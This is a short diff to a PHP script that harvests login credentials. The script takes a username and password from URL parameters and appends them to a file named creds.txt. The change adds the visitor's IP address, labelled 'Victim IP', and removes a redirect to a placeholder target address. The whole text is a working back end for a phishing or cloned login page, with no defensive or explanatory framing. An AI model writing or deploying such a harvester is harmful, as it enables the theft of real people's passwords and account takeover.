@@ -1,8 +1,7 @@
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
-    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://TARGET_IP/index.php");
+    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Username: {$_GET['username']} | Password: {$_GET['password']}\n");
     fclose($file);
     exit();
 }
